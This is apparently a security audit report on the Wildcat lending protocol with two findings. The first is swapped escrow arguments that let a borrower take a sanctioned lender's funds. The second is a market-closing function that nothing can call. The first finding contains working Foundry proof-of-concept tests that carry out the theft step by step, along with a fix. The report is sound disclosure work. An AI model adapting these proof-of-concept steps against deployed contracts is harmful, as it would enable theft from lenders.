# Venus Prime

The code under review can be found in [2023-10-wildcat](https://github.com/code-423n4/2023-10-wildcat).

## Findings summary

| ID       | Title                                                         | Severity |
| -------- | ------------------------------------------------------------- | -------- |
| [H-01]() | Borrower will steal lender's funds if lender gets sanctioned. | High     |
| [H-02]() | Missing function to close a market.                           | High     |

## [H-01] Borrower will steal lender's funds if lender gets sanctioned.

### Vulnerability details

In an event if lender gets sanctioned, borrower can call `nukeFromOrbit()` to block him from interacting with market, which will transfer all of lender's market tokens to an escrow. Also if a lender tries to execute a withdrawal while being sanctioned, protocol will automatically block him and transfer all of his money to a newly created escrow. This functionality exists to ensure a sanctioned address won't poison everyone else. But in the current implementation if a lender gets sanctioned, borrower is able to steal all of his funds that are to be transferred to an escrow.

When lender gets blocked, an escrow is deployed through a function in `WildcatSanctionsSentinel.sol`:

```solidity
function createEscrow(
    address borrower,
    address account,
    address asset
  ) public override returns (address escrowContract) {
```

Both time this function is called in `_blockAccount()` and `executeWithdrawal()` the order of arguments passed into the function is wrong.

```solidity
address escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(
          accountAddress,
          borrower,
          address(this)
```

The account parameter in escrow will actually be set to borrower, meaning funds that should be transferred back to lender in the `releaseEscrow()` function will be transferred to borrower:

```solidity
function releaseEscrow() public override {
    if (!canReleaseEscrow()) revert CanNotReleaseEscrow();

    uint256 amount = balance();

    IERC20(asset).transfer(account, amount);

    emit EscrowReleased(account, asset, amount);
  }
}
```

### Impact

Borrower will steal all of the lender's assets.

### Proof Of Concept

```js
function test_BorrowerCanStealLendersDepositOfMarketToken() external {
       address asset = market.asset();
        // Alice deposits 1e18
        _deposit(alice, 1e18);
        assertEq(market.balanceOf(alice), 1e18);
        // Alice gets sanctioned
        sanctionsSentinel.sanction(alice);
        // NukeFromOrbit is called
        market.nukeFromOrbit(alice);
        assertEq(market.balanceOf(alice), 0);

        // Escrow is deployed to this address
        address escrow = sanctionsSentinel.getEscrowAddress(
            alice,
            borrower,
            address(market)
        );
        // Now all balance of alice is transferred to escrow
        assertEq(market.balanceOf(escrow), 1e18);
        // At this point balance of the borrower is 0
        assertEq(market.balanceOf(borrower), 0);
        // Release Escrow is called, which should:
        // 1. Revert as alice is still sanctioned
        // 2. If alice would not have been sanctioned, it should've transferred escrow balance to her
        IWildcatSanctionsEscrow(escrow).releaseEscrow();
        console.log("Escrow Balance", market.balanceOf(escrow));
        console.log("Borrower Balance of Market tokens", market.balanceOf(borrower));
        // Now all of the alice balance was transferred to borrower
        assertEq(market.balanceOf(borrower), 1e18);
        assertEq(market.balanceOf(alice), 0);

        address controller = market.controller();
        // Now borrower can withdraw her balance
        vm.startPrank(borrower);
        address[] memory lenders = new address[](1);
        lenders[0] = borrower;
        address[] memory markets = new address[](1);
        markets[0] = address(market);
        // Authorize borrower as a lender in order to withdraw
        IWildcatMarketController(controller).authorizeLenders(lenders);
        IWildcatMarketController(controller).updateLenderAuthorization(
            borrower,
            markets
        );
        uint256 balanceBorrower = IERC20(asset).balanceOf(borrower);
        console.log("Balance of borrower before withdrawal", balanceBorrower);
        market.queueWithdrawal(1e18);
        uint256 batchDuration = market.withdrawalBatchDuration();
        uint32 expiry = uint32(block.timestamp + batchDuration);
        skip(batchDuration);
        market.executeWithdrawal(borrower, expiry);
        uint256 balanceBorrowerAfter = IERC20(asset).balanceOf(borrower);
        assertEq(balanceBorrowerAfter, 1e18);
        console.log(
            "Balance of borrower after withdrawal",
            balanceBorrowerAfter
        );
    }

    function test_BorrowerCanStealLendersDepositOfUnderlying() external {
        address asset = market.asset();
        _deposit(alice, 1e18);
        // address of the escrow that will be deployed for alice
        address escrow = sanctionsSentinel.getEscrowAddress(
            alice,
            borrower,
            asset
        );
        address[] memory lenders = new address[](1);
        lenders[0] = alice;
        address[] memory markets = new address[](1);
        markets[0] = address(market);
        // Sanction alice
        sanctionsSentinel.sanction(alice);
        vm.startPrank(alice);
        // Alice queues a withdrawal
        market.queueWithdrawal(1e18);
        uint256 batchDuration = market.withdrawalBatchDuration();
        uint32 expiry = uint32(block.timestamp + batchDuration);
        skip(batchDuration);
        // Because she is blocked, here balance is transferred to an escrow
        market.executeWithdrawal(alice, expiry);
        vm.stopPrank();

        uint256 balanceOfEscrowBeforeRelease = IERC20(asset).balanceOf(escrow);
        console.log("Balance Of Escrow", balanceOfEscrowBeforeRelease);
        // Now releaseEscrow is called
        // It should revert since Alice is still sanctioned
        // And if she was not sanctioned, it should transfer the balance of underlying to her
        vm.prank(borrower);
        IWildcatSanctionsEscrow(escrow).releaseEscrow();
        // Balance of escrow has been transferred
        uint256 balanceOfEscrowAfterRelese = IERC20(asset).balanceOf(escrow);
        console.log(
            "Balance Of Escrow After Relese",
            balanceOfEscrowAfterRelese
        );
        // But it was transferred to the borrower
        uint256 balanceOfBorrowerAfterRelease = IERC20(asset).balanceOf(
            borrower
        );
        console.log(
            "Balance Of Borrower After Release",
            balanceOfBorrowerAfterRelease
        );
    }
```

### Recommended Mitigation Steps

When calling `createEscrow()` ensure that order of arguments passed into a function is correct.

```diff
address escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(
-         accountAddress,
+         borrower,
-         borrower,
+         accountAddress,
          address(this)
```

## [H-02] Missing function to close a market.

### Vulnerability details

Market has a function `closeMarket()` that terminates a vault. The vault APR is set to 0% and the borrower is required to make a full return of all outstanding assets. Borrower may want to exercise this function in an event of lenders not withdrawing their assets and the borrower paying to much interests. But in current implementation there is no way to call this function.

```solidity
function closeMarket() external onlyController nonReentrant {
```

`closeMarket()` function has `onlyController` modifier, which means that it can only be called from a controller that deployed this market. In the controller contract there is no function that calls `closeMarket()`, which means there is no way to close the market.

### Recommended Mitigation Steps

Implement a way to close market, or change the modifier to onlyBorrower, that way borrower will be able to call it directly and not from controller.
